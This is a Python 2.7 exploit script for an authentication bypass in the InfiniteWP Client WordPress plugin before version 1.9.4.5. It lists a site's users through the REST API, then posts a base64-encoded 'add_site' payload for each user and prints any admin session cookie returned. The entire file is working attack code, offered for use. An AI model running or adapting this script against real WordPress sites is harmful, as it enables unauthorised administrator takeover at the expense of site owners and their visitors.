#
# InfiniteWP Client < 1.9.4.5 - Authentication Bypass
#
# Exploit Script By @random_robbie
#
# Will only work with python 2.7 sadly!
#
# Requires Wordpress API Users Exposed!
#
# Based off https://0day.work/infinitewp-client-1-9-4-5-authentication-bypass/
#

import requests
import json
import sys
import base64
import argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=True, help="Wordpress URL")
args = parser.parse_args()
url = args.url

proxies = {"http": "http://127.0.0.1:8085","https": "http://127.0.0.1:8085"}




def test_user(url,user):
	
	payload = '''{
"iwp_action": "add_site",
"id": 1,
"params": {
"username": "'''+user+'''"
}
}'''
	base64d = base64.b64encode(payload)
	payloadstring = "_IWP_JSON_PREFIX_"+base64d+""
	paramsPost2 = {""+payloadstring+""}
	headers2 = {"User-Agent":"curl/7.67.0","Connection":"close","Accept":"*/*","Content-Type":"application/x-www-form-urlencoded"}
	response2 = session.post(url, data=payloadstring, headers=headers2,verify=False)
	if 'Set-Cookie' in response2.text:
		print("[*]Found Admin User: "+user+"[*]") 
		print(response2.text)
	else:
		print ("Sadly "+user+" does not have admin rights.\n\n")
	
	
	
	




def grab_users(url):
	headers = {"User-Agent":"curl/7.54.0","Connection":"close","Accept":"*/*"}
	response = session.get(""+url+"/wp-json/wp/v2/users", headers=headers,verify=False)
	if response.status_code == 200:
		print("[*]Users Found[*]")
		jsonstr = json.loads(response.content)
		for id in jsonstr:
			userid = str(id['id'])
			userint = id['id']
			user = id['slug']
			print ("Found User: "+user+" with ID: "+userid+"")
			test_user(url,user)
			
			
grab_users(url)
